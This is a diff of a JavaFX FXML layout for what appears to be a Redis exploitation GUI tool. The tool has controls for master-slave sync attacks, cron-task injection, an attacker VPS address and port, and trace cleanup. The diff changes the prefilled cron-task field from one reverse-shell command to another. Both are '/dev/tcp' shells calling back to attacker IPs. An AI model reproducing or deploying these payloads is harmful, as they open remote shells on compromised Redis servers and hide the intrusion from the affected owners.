@@ -12,13 +12,12 @@
 <?import javafx.scene.layout.HBox?>
 <?import javafx.scene.layout.VBox?>
 
-<VBox prefHeight="771.0" prefWidth="898.0" xmlns="http://javafx.com/javafx/16" xmlns:fx="http://javafx.com/fxml/1" fx:controller="Controller.RedisController">
+<VBox prefHeight="771.0" prefWidth="898.0" xmlns="http://javafx.com/javafx/18" xmlns:fx="http://javafx.com/fxml/1" fx:controller="Controller.RedisController">
    <children>
       <TitledPane animated="false" collapsible="false" prefWidth="790.0" text="功能选择">
          <content>
             <HBox prefHeight="41.0" prefWidth="788.0" spacing="10.0">
                <children>
-                  <Button fx:id="redisSlavebtn" mnemonicParsing="false" onAction="#redisSlave" text="主从同步" />
                   <Button fx:id="redisClearBtn" layoutX="276.0" layoutY="22.0" mnemonicParsing="false" onAction="#redisClear" text="痕迹清理" />
                </children>
             </HBox>
@@ -39,19 +38,20 @@
                         <Insets top="5.0" />
                      </HBox.margin>
                   </Label>
-                  <TextField fx:id="redisVPSAddressTextField" maxWidth="Infinity" prefHeight="27.0" prefWidth="202.0" HBox.hgrow="ALWAYS" />
+                  <TextField fx:id="redisVPSAddressTextField" maxWidth="Infinity" prefHeight="27.0" prefWidth="183.0" HBox.hgrow="ALWAYS" />
                   <Label text="端口:">
                      <HBox.margin>
                         <Insets top="5.0" />
                      </HBox.margin>
                   </Label>
-                  <TextField fx:id="redisVPSPortTextField" />
+                  <TextField fx:id="redisVPSPortTextField" prefHeight="26.0" prefWidth="99.0" />
                   <Label text="延时(s):">
                      <HBox.margin>
                         <Insets top="5.0" />
                      </HBox.margin>
                   </Label>
-                  <TextField fx:id="redisVPSTimeOutTextField" />
+                  <TextField fx:id="redisVPSTimeOutTextField" prefHeight="26.0" prefWidth="105.0" />
+                  <Button fx:id="redisSlavebtn" mnemonicParsing="false" onAction="#redisSlave" text="主从同步" />
                </children>
                <padding>
                   <Insets left="5.0" right="5.0" top="8.0" />
@@ -83,7 +83,7 @@
                   </VBox>
                </content>
           </Tab>
-            <Tab text="扩展功能">
+            <Tab text="Linux">
                <content>
                   <TabPane prefHeight="200.0" prefWidth="200.0" tabClosingPolicy="UNAVAILABLE">
                     <tabs>
@@ -91,7 +91,7 @@
                            <content>
                               <VBox prefHeight="200.0" prefWidth="100.0">
                                  <children>
-                                    <TextArea fx:id="redisCronTaskInput" prefHeight="345.0" prefWidth="888.0" text="bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1">
+                                    <TextArea fx:id="redisCronTaskInput" prefHeight="345.0" prefWidth="888.0" text="* * * * * ? /bin/sh -i &gt;&amp; /dev/tcp/10.211.55.2/9999 0&gt;&amp;1">
                                        <VBox.margin>
                                           <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
                                        </VBox.margin>
